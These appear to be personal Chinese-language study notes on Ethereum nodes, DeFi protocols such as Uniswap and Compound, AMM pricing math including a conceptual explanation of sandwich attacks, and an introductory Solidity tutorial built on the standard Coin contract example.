<p>以太坊的区块是由区块头、交易列表和叔区块三部分组成。其中区块头包含块区号、块哈希、父块哈希等信息，其中State Root、Transaction Root、Receipt Root分别代表了<strong>状态树、交易树和交易树</strong>的哈希。除了创世块外，每个块都有父块，用Parent Hash连成一条区块链。</p>
<p>状态树：整个以太坊系统中只有一棵<strong>状态树</strong>，记录整个以太坊系统的所有账户状态。</p>
<p>交易树：每个区块保存着一棵交易树，记录该区块的交易情况。</p>
<p>收据数：每个区块保存着一棵收据树，记录该区块的交易收据。</p>
<p><img src="Advanced/Blockchain/Basic/../images/1620.png" alt="tree" /></p>
<h2 id="达成共识"><a class="header" href="#达成共识">达成共识</a></h2>
<h3 id="全节点"><a class="header" href="#全节点">全节点</a></h3>
<ul>
<li>存储完整的区块链数据（会进行定期精减，所以全节点并不存储包含创世块在内的所有状态数据）</li>
<li>参与区块验证，验证所有区块和状态。</li>
<li>所有状态都可以从全节点中获取（尽管非常久远的状态是通过向归档节点发出请求重建的）。</li>
<li>提供网络服务，并应要求提供数据。</li>
</ul>
<h3 id="轻节点"><a class="header" href="#轻节点">轻节点</a></h3>
<p>轻节点不下载所有区块，而是下载区块头。 这些区块头只包含区块内容的摘要信息。 轻节点所需的任何其他信息都从全节点请求。 然后，轻节点可以根据区块头中的状态根独自验证收到的数据。 轻节点可以让用户加入以太坊网络，无需运行全节点所需的功能强大的硬件或高带宽。 最终，轻节点也许能在手机和嵌入式设备中运行。 轻节点不参与共识（即它们不能成为矿工或验证者），但可以访问以太坊区块链，其功能与全节点相同。</p>
<p>执行客户端 Geth 有一个<a href="https://github.com/ethereum/devp2p/blob/master/caps/les.md">轻量同步</a>选项。 然而，Geth 轻节点依赖于提供轻节点数据的全节点。 很少有全节点选择提供轻节点数据，这意味着轻节点通常无法找到对等节点。 共识层目前没有生产就绪的轻客户端，但是，有几个正在开发中。</p>
<p>可能还有一些方法可供在 <a href="https://www.ethportal.net/">gossip 网络</a>上提供轻客户端数据。 这是有利的，因为 gossip 网络可以支持轻节点网络，而无需全节点来满足请求。</p>
<p>以太坊目前还不支持大量轻节点，但轻节点支持是一个有望在不久的将来快速发展的领域。</p>
<h3 id="归档节点"><a class="header" href="#归档节点">归档节点</a></h3>
<ul>
<li>存储全节点中保存的所有内容，并建立历史状态存档。 如果想查询区块 #4,000,000 中的帐户余额等内容，或者想简单可靠地<a href="https://openethereum.github.io/JSONRPC-trace-module#trace_callmany">测试自己的一组交易而不使用 OpenEthereum 挖矿</a>，则需要归档节点。</li>
<li>这些数据用太字节作为单位，这使存档节点对普通用户的吸引力降低，但对于诸如区块浏览器、钱包供应商和链分析之类的服务而言却很方便。</li>
</ul>
<p>以归档以外的任何方式同步客户端将导致区块链数据被精剪。 这意味着，没有所有历史状态的存档，但全节点能够在需要时构建它们。</p>
<ul>
<li>世界状态：在以太坊中，所有账户（包括合约账户、普通账户）的状态数据统称为世界状态；</li>
<li>轻节点：指只存储区块头数据的区块链节点；</li>
<li>区块链分叉：指向同一个父块的2个区块被同时生成的情况，某些部分的矿工看到其中一个区块，其他的矿工则看到另外一个区块。这导致2种区块链同时增长；</li>
<li>区块头：指以太坊区块结构体的一部分，用于存储该区块的头部信息，如父区块哈希、世界状态哈希、交易回执集合哈希等。区块头仅存储一些“固定”长度的哈希字段；</li>
</ul>
<p>全节点，轻节点。</p>
<p>每个全节点都会去执行智能合约，改变本地存储的数据结构，验证其他节点发布的区块的合法性。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="defi"><a class="header" href="#defi">DeFi</a></h1>
<p>所谓DeFi就是去中心化金融。</p>
<img src="Advanced/Blockchain/Defi/../images/image-20220923163221447.png" alt="image-20220923163221447" style="zoom:50%;" />
<ol>
<li>Stable Coins</li>
<li>Lending and Borrowing</li>
<li>Exchanges</li>
<li>Derivatives</li>
<li>Fund Management</li>
<li>Lottery</li>
<li>Payments</li>
<li>Insurance</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-autonomous-organization"><a class="header" href="#decentralized-autonomous-organization">Decentralized Autonomous Organization</a></h1>
<p>DAO是去中心化自治组织(Decentralized Autonomous Organization)的缩写。DAO其实不算是Defi的一部分，但是DAO也是非常重要的智能合约的一种。</p>
<p>基本思路是，用质押代币换DAO Token，DAO Token代表了投票的权重，然后大家一起投票去决定一些事情。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-derivative"><a class="header" href="#decentralized-derivative">Decentralized Derivative</a></h1>
<p>A derivative(金融衍生品) is a contract whose value is derived from another underlying
asset such as stocks, commodities, currencies, indexes, bonds, or interest rates.</p>
<p>并不是很明白是做什么用的</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-exchange"><a class="header" href="#decentralized-exchange">Decentralized Exchange</a></h1>
<blockquote>
<p>传统的中心化加密数字货币交易平台，如火币，Coinbase等。</p>
<p>去中心化交易，目标是通过区块链技术，使用智能合约来减少或消除中间人，如Uniswap, 0x, DDEX, Kyber。</p>
<p>Uniswap是以太坊上实现Token交易自动化的协议。他为不同的ERC20代币创建单独的货币市场（ERC20是以太坊上的Fungible Token标准）。每个人都能在这个平台上部署智能合约，为任何ERC20代币创建一个新的交易所，ETH&lt;=&gt;ERC20。以ETH为媒介来撮合两种代币之间的交易。</p>
</blockquote>
<p>Swap指的是交换不同的代币。</p>
<h2 id="uniswap"><a class="header" href="#uniswap">Uniswap</a></h2>
<p><code>Uniswap</code>是<code>DeFi</code>中最著名的协议之一，<code>Uniswap</code>本质是一个自动化做市商（Automated Market Maker,AMM），它舍弃了传统订单薄的撮合方式，采用流动池加<strong>恒定乘积</strong>公式算法($x\times y = k$)为不同加密资产提供即时报价和兑换服务。</p>
<blockquote>
<p>举个 ETH / DAI 交易对的简单例子<sup class="footnote-reference"><a href="#1">1</a></sup>。假设做市商已经为这一流动性池注入了 100,000 DAI 和 1,000 ETH 的资金。Uniswap 将这两个数量相乘（100,000 x 1,000 = 100,000,000）。</p>
<div class="table-wrapper"><table><thead><tr><th>DAI Liquidity</th><th>ETH Liquidity</th><th>Product</th></tr></thead><tbody>
<tr><td>100,000</td><td>1,000</td><td>100,000,000</td></tr>
<tr><td>x</td><td>y</td><td>k</td></tr>
</tbody></table>
</div>
<p>Uniswap 针对这一特定交易对的目标是：<strong>无论交易活动多少，该产品都将始终保持 1 亿的交易对乘积数量</strong>（因此称为“恒定乘积做市商”）。</p>
<p>要记住 x * y = k 这一关键公式，其中 x 和 y 是流动性池中的代币数量，k 是乘积。要想保持 k 恒定，x 和 y 只能相互反向变动。比如某一交易者在此合约中用 DAI 购买 ETH，则他们正在增加 x（因为增加了流动池中的 DAI），同时也减少了 y（因为减少了流动池中的 ETH）。但这个反向变化不是线性增长的关系。</p>
<p>所以，当交易者想用ETH兑换DAI时，用户要花$dy = \frac {k} {x-dx} -y$个ETH来兑换$dx$个DAI。$(y+dy)(x-dx) = k$推导而来</p>
</blockquote>
<p>另外，对于流动性的提供者，会给予LP token作为凭证。比如我往池子里注入了1ETH和100DAI，可能就会给我发1LP token代表我占有池中资产的份额。</p>
<h2 id="恒定乘积公式2"><a class="header" href="#恒定乘积公式2">恒定乘积公式<sup class="footnote-reference"><a href="#2">2</a></sup></a></h2>
<ul>
<li>
<p>基本的公式，推导的起点。这里的$d$并不是微积分的概念，仅表示差值。也就是兑换的币的数量。我们用X币兑换Y币
$$
x\times y = k, (x+dx)(y-dy) = k
$$</p>
</li>
<li>
<p>若设$\alpha = dx/x, \beta = dy/y$（代表兑换的A币占市场A币的总量，兑换的B币占市场B币的总量）。我们可以由上面的两个式子得到 $(1+\alpha)(1-\beta) = 1$
$$
dx = \frac {b}{1-b} x, dy = \frac {a}{1+a}y
$$</p>
</li>
<li>
<p>在Uniswap进行的每一笔交易都会被收取$ρ = 0.3%$的手续费给流动性的提供者，将手续费纳入公式的考量。手续费 $ρ=0.3%$ 的意思是会从付款中扣掉0.3%，也就是从$dx$扣。在有手续费的情况下$dx$ 就变成了$(1-ρ)dx$, 若另$γ = 1-ρ$，我们就有$dx$变成了$γdx$，带入到(2)式中得到
$$
dx = \frac{\beta}{1-\beta} \times \frac{1}{\gamma} \times x, dy = \frac {\alpha\gamma}{1+\alpha\gamma} \times y
$$</p>
</li>
<li>
<p>事实上，手续费的存在让k并非恒定值，有微小的改变（变大）：
$$
x'y' = (x+dx)(y-dy) = (1+\beta(1/\gamma - 1))xy
$$</p>
</li>
</ul>
<p>滑点：对于 AMM 类型的 DEX，比如 Uniswap 中有一个 DAI/USDT 的交易池，池中的储备量为：100DAI + 100USDT，DAI 在池中的 <strong>spot price</strong> 是 1 USDT/DAI ，但是，这时我们用 100 DAI 只能从池中换出 50 个USDT（没有考虑手续费），<strong>实际价格（effective price）<strong>为 0.5 USDT/DAI。我们把这部分的差就叫做</strong>滑点（slippage）</strong>。</p>
<p>深度：还是 USDT/DAI 池，池中的储备量为：1000DAI + 1000USDT，可以发现：这时用100DAI能够换出的USDT数量为：90.90个，明显可以看出这次 effective price 就更接近 spot price，此时的滑点为：(1 - 0.909) / 1 = 0.091 = 9.1%。原因就在于池子的储备量大了，这便是交易池的<strong>深度</strong>。</p>
<p><strong>底层代币的储备量越大（深度越大），价格差异越小（滑点越低）</strong>。</p>
<h2 id="改变流动性"><a class="header" href="#改变流动性">改变流动性</a></h2>
<p>用户可以向合约注入流动性。不过并不是随便注入的，要考虑：</p>
<ol>
<li>要按照当前货币的比例注入流动性</li>
<li>用户注入流动性，是需要合约来存储的，用户需要为这部分存储付费。</li>
</ol>
<p>当用户注入流动性后，我们需要给用户流动性凭证(在Uniswap中就是LP Token)，或者说是股份。</p>
<p>用户也可以把自己注入的流动性取出来。要考虑：</p>
<ol>
<li>滑点。可以规定取出的Token的最小值。</li>
</ol>
<h2 id="除法误差"><a class="header" href="#除法误差">除法误差</a></h2>
<h2 id="攻击"><a class="header" href="#攻击">攻击</a></h2>
<h3 id="三明治攻击"><a class="header" href="#三明治攻击">三明治攻击</a></h3>
<p>三明治攻击（sandwich attacks）是DeFi里流行的抢先交易技术的一种。以上面的池子为例。Victim本来想要用一开始的市场价，用1ETH换约10个DAI。</p>
<div class="table-wrapper"><table><thead><tr><th>User</th><th>DAI</th><th>ETH</th><th>Product</th><th>DAI/EHT</th></tr></thead><tbody>
<tr><td></td><td>10,000</td><td>1,000</td><td>10,000,000</td><td>10</td></tr>
<tr><td>Attacker</td><td></td><td></td><td></td><td></td></tr>
<tr><td>Victim</td><td>9990.01</td><td>1001</td><td>10,000,000</td><td>9.98</td></tr>
<tr><td>Attacker</td><td></td><td></td><td></td><td></td></tr>
</tbody></table>
</div>
<p>这时，一个攻击者知道了你想要进行这比交易，于是他在你之前抢先进行了一笔交易，通过向池子里大量注入ETH让你的换不到10个DAI。比如</p>
<ol>
<li>Attacker先用1000ETH换了5000个DAI，这时DAI/ETH的价格变成了2.5</li>
<li>Victim仍然用1ETH，这时只能换到约2.5DAI</li>
<li>Attacker再用5000DAI换ETH，这时他能换到1000.75个ETH。所以攻击者空手套了0.75个ETH，市场价恢复原来的样子。</li>
</ol>
<p>Attacker的交易把Victim的交易夹住，就像三明治一样。</p>
<div class="table-wrapper"><table><thead><tr><th>User</th><th>DAI</th><th>ETH</th><th>Product</th><th>DAI/EHT</th></tr></thead><tbody>
<tr><td></td><td>10,000</td><td>1,000</td><td>10,000,000</td><td>10</td></tr>
<tr><td>Attacker</td><td>5000</td><td>2,000</td><td>10,000,000</td><td>2.5</td></tr>
<tr><td>Victim</td><td>4997.5</td><td>2,001</td><td>10,000,000</td><td>2.498</td></tr>
<tr><td>Attacker</td><td>9997.5</td><td>1000.25</td><td>10,000,000</td><td>9.995</td></tr>
</tbody></table>
</div>
<p>当然实际的交易要考虑手续费、Gas费等其他因素，操作不当Attacker有可能反而会亏本。</p>
<p>而Victim为了应对这种攻击，可以<strong>设置滑点</strong>为10%，即市场价为10的时候你希望能兑换到的DAI不少于9个，这样被攻击后导致你只能换到2.5个就会导致交易失败。不过，滑点设置的太大还是会给攻击者留下空间。</p>
<h3 id="吸血鬼攻击"><a class="header" href="#吸血鬼攻击">吸血鬼攻击</a></h3>
<p>简单来说，加密货币的吸血鬼攻击就是将其他项目的流动性转移至己方项目，从而夺去其他平台的流动性，增加己方平台的价值，实现快速崛起。</p>
<p>一个例子，就是Sushiswap对Uniswap做的事情。</p>
<p>前面提到，Uniswap会将交易的0.3%手续费给流动性的提供者，作为激励。一开始，Uniswap就这么单纯。</p>
<p>而Sushiswap引入了代币激励(代币的名字就是SUSHI)，SUSHI跟随以太坊区块产出，总量无上限，前10万个区块中每个区块释放1000 SUSHI，后续每个区块释放100 SUSHI。另外0.3%手续费中，0.25%手续费给流动性的提供者，作为激励，而0.05%则是用来回购SUSHI。那么为什么给矿工SUSHI比手续费更有吸引力——或者说，SUSHI的价值来自哪里，来自于回购SUSHI。</p>
<blockquote>
<p>猜测：因为Sushiswap前期对流动性提供者的激励更大，所以能吸引矿工？</p>
</blockquote>
<h3 id="价格操控攻击"><a class="header" href="#价格操控攻击">价格操控攻击</a></h3>
<hr />
<h2 id="stable-swap"><a class="header" href="#stable-swap">Stable Swap</a></h2>
<p>上面提到的恒定乘积算法并不适用稳定币的交换。</p>
<p><img src="https://blog.hubbleprotocol.io/content/images/2022/04/image-30.png" alt="Visualizing the stable swap invariant." /></p>
<p>紫色虚线是我们之前提到的恒定乘积公式$xy=const$，不难看出使用这个做法的话会造成两种币之间的汇率出现较大波动，这是不适合稳定币的交换的。</p>
<p>红色虚线是最理想的情况，x和y保持稳定汇率。也就是$x+y=const$。但是他需要流动性提供者注入巨量的币而且没有自动调节能力。</p>
<p>蓝色实线是我们采用的办法，一种中间手段，在不极端的情况下汇率稳定。我们使用的公式为
$$
An^n \sum x_{i} + D = ADn^n + \frac{D^{n+1}}{n^n \prod x_{i}}
$$
下面解释这个公式，首先，他不止两个货币。假设有n种货币$x_1,x_2...x_n$。</p>
<ul>
<li>
<p>那么恒定和的公式变成$\Sigma x_i = D$</p>
</li>
<li>
<p>那么恒定乘积公式变成$\prod x_i = (D/n)^n$，其中D是货币价值相等（数量也相等）时的总量。</p>
</li>
<li>
<p>把这两个公式加权$\chi$合并起来，变成了
$$
\chi\Sigma x_i + \prod x_i = \chi D + (\frac D n)^n
$$
当$\chi = 0$和$\chi = + \infin$的时候，分别就是恒定乘积公式和恒定和公式。</p>
<p>不过，我们让权为$\chi D^{n-1}$，这样和n无关。
$$
\chi D^{n-1} \Sigma x_i + \prod x_i = \chi D^n + (\frac D n)^n
$$
但是这样还不够。If this equation holds at all times, we will have trades with a leverage χ. However, it wouldn’t support prices going far from the ideal price 1.0. The invariant should support any prices (so that we have some liquidity at all times). In order to do so, we make χ dynamic. When the portfolio is in a perfect balance, it’s equal to a constant A, however falls off to 0 when going out of balance: $χ=\frac {A \prod x_i} {(D/n)^n}$。那么我们就会得到上面的公式
$$
An^n \sum x_{i} + D = ADn^n + \frac{D^{n+1}}{n^n \prod x_{i}}
$$</p>
</li>
</ul>
<hr />
<p>参考资料：</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p><a href="https://u.naturaldao.io/be/chapter5/5.6%20%E9%80%9A%E7%94%A8%E7%9A%84%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%BA%A4%E6%98%93%E5%8D%8F%E8%AE%AEUniswap">区块链概论-5.6 通用的去中心化交易协议Uniswap</a>
<sup class="footnote-reference"><a href="#2">2</a></sup>: <a href="https://medium.com/taipei-ethereum-meetup/uniswap-explanation-constant-product-market-maker-model-in-vyper-dff80b8467a1">Uniswap 解析：恒定乘积做市商模型Constant Product Market Maker Model 的Vyper 实作</a></p>
</div>
<p>吸血鬼，三明治。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-fund-management"><a class="header" href="#decentralized-fund-management">Decentralized Fund Management</a></h1>
<p>投资。就目前来说，所谓的投资，无非就是在各种代币之间兑换来套利。</p>
<p>TokenSets平台，允许用户通过购买这个平台发行的代币，然后他使用定义好的策略来帮你自动投资，获取收益。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-insurance"><a class="header" href="#decentralized-insurance">Decentralized Insurance</a></h1>
<p>DeFi项目，虽然在上线前往往会经过大量的安全审计，但是还是存在着风险</p>
<ol>
<li>Technical Risks: where smart contracts could be hacked or bugs could be
exploited;</li>
<li>Liquidity Risks: where protocols like Compound could run out of
liquidity;</li>
<li>Admin Key Risks: where the master private key for the protocol could be
compromised.</li>
</ol>
<p>那么，就可以为DeFi项目买保险。</p>
<p>Nexus Mutual项目。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-lending--borrowing"><a class="header" href="#decentralized-lending--borrowing">Decentralized Lending &amp; Borrowing</a></h1>
<p>Compound项目。</p>
<p>你可以在这边借贷7种不同的Token --&gt; Attention Token (BAT), Dai (DAI), Ether (ETH), Augur (REP), USD Coin (USDC), Wrapped Bitcoin (WBTC) and 0x (ZRX).</p>
<ul>
<li>你把token lend给Compound: 你可以收获利息。
<ul>
<li>利息通过cToken的方式进行支付，如借DAI给Compound平台，他会给你相应的cDAI，cDAI换DAI的比例会逐渐上升。</li>
</ul>
</li>
<li>你通过抵押token A借token B: 你要为此支付利息。</li>
</ul>
<p>将token借给Compound是为了他的利息，这个和传统银行类似。和传统银行的区别是，目前通过抵押token A借token B的原因主要是为了套利，而不是为了获取资金从事真正的啥活动。</p>
<blockquote>
<p>用抵押价值更多的token A换价值更低的token B的方式，我觉得本身就是比较愚蠢的行为，只会吸引投机套利者。我的评价是不如Uniswap。</p>
</blockquote>
<p>一个潜在的问题是————这个模型要求抵押的token A的总价值一定要高于置换的token B的总价值，但是token的价值是波动的————那么如果抵押的token A的总价值低于了token B的总价值，这时就会触发<strong>Liquidation</strong>，他们的抵押资产token A就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-lottery"><a class="header" href="#decentralized-lottery">Decentralized Lottery</a></h1>
<blockquote>
<p>区块链要求确定的输入有确定的输出，那么抽奖这种随机的事件要怎么去做呢？伪随机会被黑客利用吗？</p>
</blockquote>
<p>PoolTogether项目。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="decentralized-payments"><a class="header" href="#decentralized-payments">Decentralized Payments</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stable-coins"><a class="header" href="#stable-coins">Stable Coins</a></h1>
<p>稳定币是DeFi金融的基石。加密货币经过特殊设计，保持和法定货币&quot;稳定&quot;的汇率。大多与美元挂钩，例如USDT，TrueUSD，DAI。而像比特币，Ether这样的普通加密货币的价值波动是非常大的。</p>
<h2 id="常见的稳定币"><a class="header" href="#常见的稳定币">常见的稳定币</a></h2>
<ul>
<li>USDT</li>
<li>USDC</li>
<li>PAX</li>
<li>TUSD</li>
<li>DAI</li>
</ul>
<p>稳定币和法币挂钩(e.g. USD-pegged 与美元挂钩)的方式，主要有两种 <strong>fiat-collateralized</strong> 和 <strong>crypto-collateralized</strong> 。</p>
<p>USDT使用了fiat-collateralized的方式，每一个USDT背后保证有一个美元为其价值背书。</p>
<p>DAI则使用了crypto-collateralized的方式，使用Ether为其价值背书。他和美元保持约1:1汇率的方式是通过DAO的投票。</p>
<h2 id="dai"><a class="header" href="#dai">DAI</a></h2>
<p>Maker组织是一个DAO。它发行了DAI，还发行了MKR作为DAO的凭证(governance token)。用户持有的MKR正比于其投票治理Maker的权重。</p>
<div style="break-before: page; page-break-before: always;"></div><p>以太坊的账户模型</p>
<ul>
<li>external owned account
<ul>
<li>balance</li>
<li>nonce</li>
</ul>
</li>
<li>smart contract account
<ul>
<li>code</li>
<li>storages</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solidity简介"><a class="header" href="#solidity简介">Solidity简介</a></h1>
<p>Solidity 是一门面向合约的、为实现智能合约而创建的高级编程语言。智能合约是管理以太坊状态里账户行为的程序。Solidity是一种针对Ethereum虚拟机（EVM）设计的花括号语言。Solidity 是静态类型语言，支持继承、库和复杂的用户定义类型等特性。</p>
<p>我并不喜欢这一语言，但是以太坊太流行了，能找到的例子基本都是以太坊的。不得不学习一下，否则看不懂攻击事件了。</p>
<p>下文中的类比对象是使用Rust的NEAR-SDK</p>
<h2 id="hello-world-1"><a class="header" href="#hello-world-1">Hello world <sup class="footnote-reference"><a href="#english">1</a></sup></a></h2>
<pre><code class="language-solidity">// 推荐指明使用的Licence，供机器阅读
// SPDX-License-Identifier: GPL-3.0
// 使用的编译器版本
pragma solidity ^0.8.4;

contract Coin {
    // The keyword &quot;public&quot; makes variables accessible from other contracts
    address public minter;
    mapping (address =&gt; uint) public balances;

    // Events allow clients to react to specific
    // contract changes you declare
    event Sent(address from, address to, uint amount);

    // Constructor code is only run when the contract
    // is created
    constructor() {
        minter = msg.sender;
    }

    // Sends an amount of newly created coins to an address
    // Can only be called by the contract creator
    function mint(address receiver, uint amount) public {
        require(msg.sender == minter);
        balances[receiver] += amount;
    }

    // Errors allow you to provide information about
    // why an operation failed. They are returned
    // to the caller of the function.
    error InsufficientBalance(uint requested, uint available);

    // Sends an amount of existing coins
    // from any caller to an address
    function send(address receiver, uint amount) public {
        if (amount &gt; balances[msg.sender])
            revert InsufficientBalance({
                requested: amount,
                available: balances[msg.sender]
            });

        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }
}
</code></pre>
<ul>
<li>
<p><code>address public minter;</code>: <code>address</code>是类型，下面会介绍。<code>public</code>会自动生成getter方法如下</p>
<pre><code class="language-solidity">function minter() external view returns (address) { return minter; }
</code></pre>
</li>
<li>
<p><code>mapping (address =&gt; uint) public balances;</code>: <code>mapping</code>是类型。他生成的getter方法和上面不太一样。</p>
<pre><code class="language-solidity">function balances(address account) external view returns (uint) {
    return balances[account];
}
</code></pre>
</li>
<li>
<p><code>event Sent(address from, address to, uint amount);</code> 声明了一个Event，所谓的Event类似于日志，他让用户方便监测合约上发生了什么事件，原文中给出了监听事件的web3.js代码。通过<code>emit</code>发出。</p>
</li>
<li>
<p><code>constructor()</code>: 顾名思义是构造函数，只在创建合约时运行，不能在创建之后调用。</p>
<ul>
<li><code>msg.sender</code>: 特殊的&quot;全局变量&quot;<sup class="footnote-reference"><a href="#svf">2</a></sup></li>
</ul>
</li>
<li>
<p><code>function mint(address receiver, uint amount) public {}</code>和<code>send</code>是用来给其他用户和合约调用的。</p>
<ul>
<li><code>require</code>方法类似于<code>assert!</code>,<code>require(msg.sender == minter);</code>就是保证只有合约的创建者可以调用<code>mint</code></li>
</ul>
</li>
<li>
<p><code>error InsufficientBalance(uint requested, uint available);</code>: <code>Errors</code>用来向调用者描述错误信息。<code>Error</code>与 <code>revert</code> 语句 一起使用。 <code>revert</code> 语句无条件地中止执行并回退所有的变化，类似于 <code>require</code> 函数，它也同样允许你提供一个错误的名称和额外的数据，这些额外数据将提供给调用者(并最终提供给前端应用程序或区块资源管理器），这样就可以更容易地调试或应对失败。类比于<code>panic</code>。</p>
</li>
</ul>
<p>原来NEAR-SDK中借鉴了非常多solidity的设计。</p>
<p>还有奇怪的<a href="https://docs.soliditylang.org/en/v0.8.17/structure-of-a-contract.html#function-modifiers">修饰器语法</a>，能做到的事情类似Python的装饰器，Rust的过程宏。</p>
<h2 id="类型"><a class="header" href="#类型">类型</a></h2>
<h3 id="值类型"><a class="header" href="#值类型">值类型</a></h3>
<p>Solidity中有一个<strong>地址类型Address</strong>。地址类型有两种形式，他们大致相同：</p>
<ul>
<li><code>address</code>：保存一个20字节的值（以太坊地址的大小）。</li>
<li><code>address payable</code> ：可支付地址，与 <code>address</code> 相同，不过有成员函数 <code>transfer</code> 和 <code>send</code> 。</li>
</ul>
<p>这种区别背后的思想是 <code>address payable</code> 可以向其发送以太币，而不能先一个普通的 <code>address</code> 发送以太币，例如，它可能是一个智能合约地址，并且不支持接收以太币。</p>
<p>地址类型成员变量：</p>
<ul>
<li><code>&lt;address&gt;.balance</code> (<code>uint256</code>)：以 Wei 为单位的 <a href="https://learnblockchain.cn/docs/solidity/types.html#address">地址类型 Address</a> 的余额。</li>
<li><code>&lt;address&gt;.code</code> (<code>bytes memory</code>)：在 <a href="https://learnblockchain.cn/docs/solidity/types.html#address">地址类型 Address</a> 上的代码(可以为空)</li>
<li><code>&lt;address&gt;.codehash</code> (<code>bytes32</code>)：<a href="https://learnblockchain.cn/docs/solidity/types.html#address">地址类型 Address</a> 的codehash</li>
<li><code>&lt;address payable&gt;.transfer(uint256 amount)</code>：向 <a href="https://learnblockchain.cn/docs/solidity/types.html#address">地址类型 Address</a> 发送数量为 amount 的 Wei，失败时抛出异常，使用固定（不可调节）的 2300 gas 的矿工费。</li>
<li><code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code>：向 <a href="https://learnblockchain.cn/docs/solidity/types.html#address">地址类型 Address</a> 发送数量为 amount 的 Wei，失败时返回 <code>false</code>，发送 2300 gas 的矿工费用，不可调节。</li>
<li><code>&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</code>：用给定的有效载荷（payload）发出低级 <code>CALL</code> 调用，返回成功状态及返回数据，发送所有可用 gas，也可以调节 gas。</li>
<li><code>&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)</code>：用给定的有效载荷 发出低级 <code>DELEGATECALL</code> 调用 ，返回成功状态并返回数据，发送所有可用 gas，也可以调节 gas。 发出低级函数 <code>DELEGATECALL</code>，失败时返回 <code>false</code>，发送所有可用 gas，可调节。</li>
<li><code>&lt;address&gt;.staticcall(bytes memory) returns (bool, bytes memory)</code>：用给定的有效载荷 发出低级 <code>STATICCALL</code> 调用 ，返回成功状态并返回数据，发送所有可用 gas，也可以调节 gas。</li>
</ul>
<h3 id="合约类型"><a class="header" href="#合约类型">合约类型</a></h3>
<p>每一个 <a href="https://learnblockchain.cn/docs/solidity/contracts.html#contracts">contract</a> 定义都有他自己的类型。</p>
<p>您可以隐式地将合约转换为从他们继承的合约。 合约可以显式转换为 <code>address</code> 类型。合约类型的成员是合约的外部函数及 public 的 状态变量。</p>
<h3 id="定长字节数组"><a class="header" href="#定长字节数组">定长字节数组</a></h3>
<p>关键字有：<code>bytes1</code>， <code>bytes2</code>， <code>bytes3</code>， …， <code>bytes32</code>。</p>
<h3 id="变长字节数组"><a class="header" href="#变长字节数组">变长字节数组</a></h3>
<ul>
<li>
<p><code>bytes</code>:</p>
<p>变长字节数组，参见 <a href="https://learnblockchain.cn/docs/solidity/types.html#arrays">数组</a>。它并不是值类型。</p>
</li>
<li>
<p><code>string</code>:</p>
<p>变长 UTF-8 编码字符串类型，参见 <a href="https://learnblockchain.cn/docs/solidity/types.html#arrays">数组</a>。并不是值类型。</p>
</li>
</ul>
<h3 id="映射"><a class="header" href="#映射">映射</a></h3>
<p>映射类型在声明时的形式为 <code>mapping(KeyType =&gt; ValueType)</code>。 其中</p>
<ul>
<li><code>KeyType</code> 可以是任何基本类型，即可以是任何的内建类型， <code>bytes</code> 和 <code>string</code> 或合约类型、枚举类型。 而其他用户定义的类型或复杂的类型如：映射、结构体、即除 <code>bytes</code> 和 <code>string</code> 之外的数组类型是不可以作为 <code>KeyType</code> 的类型的。</li>
<li><code>ValueType</code> 可以是包括映射类型在内的任何类型。</li>
</ul>
<p>在映射中，实际上并不存储 key，而是存储它的 <code>keccak256</code> 哈希值，从而便于查询实际的值。这个和我们熟悉的HashMap是不同的。</p>
<h3 id="函数类型"><a class="header" href="#函数类型">函数类型</a></h3>
<p>函数类型是一种表示函数的类型。可以将一个函数赋值给另一个函数类型的变量，也可以将一个函数作为参数进行传递，还能在函数调用中返回函数类型变量。 函数类型有两类： - <em>内部（internal）</em> 函数类型 - <em>外部（external）</em> 函数类型。</p>
<pre><code class="language-solidity">function \
	(&lt;parameter types&gt;) \
	{internal|external} \
	[pure|constant|view|payable] \
	[returns (&lt;return types&gt;)]
</code></pre>
<p>函数类型 <code>A</code> 可以隐式转换为函数类型 <code>B</code> 当且仅当: 它们的参数类型相同，返回类型相同，它们的内部/外部属性是相同的，并且 <code>A</code> 的状态可变性比 <code>B</code> 的状态可变性更具限制性，比如：</p>
<ul>
<li><code>pure</code> 函数可以转换为 <code>view</code> 和 <code>non-payable</code> 函数</li>
<li><code>view</code> 函数可以转换为 <code>non-payable</code> 函数</li>
<li><code>payable</code> 函数可以转换为 <code>non-payable</code> 函数</li>
</ul>
<p>其他的转换则不可以。</p>
<h2 id="合约"><a class="header" href="#合约">合约</a></h2>
<p>Solidity**合约(contract)**类似于面向对象语言中的类。合约中有用于数据持久化的状态变量，和可以修改状态变量的函数。</p>
<h2 id="特殊变量和函数"><a class="header" href="#特殊变量和函数">特殊变量和函数</a></h2>
<p>在全局命名空间中已经存在了（预设了）一些特殊的变量和函数，他们主要用来提供关于区块链的信息或一些通用的工具函数。</p>
<h3 id="区块和交易属性"><a class="header" href="#区块和交易属性">区块和交易属性</a></h3>
<ul>
<li><code>blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希 —— 仅可用于最新的 256 个区块且不包括当前区块，否则返回 0 。</li>
<li><code>block.basefee</code> (<code>uint</code>): 当前区块的基础费用，参考： (<a href="https://eips.ethereum.org/EIPS/eip-3198">EIP-3198</a> 和 <a href="https://eips.ethereum.org/EIPS/eip-1559">EIP-1559</a>)</li>
<li><code>block.chainid</code> (<code>uint</code>): 当前链 id</li>
<li><code>block.coinbase</code> ( <code>address</code> ): 挖出当前区块的矿工地址</li>
<li><code>block.difficulty</code> ( <code>uint</code> ): 当前区块难度</li>
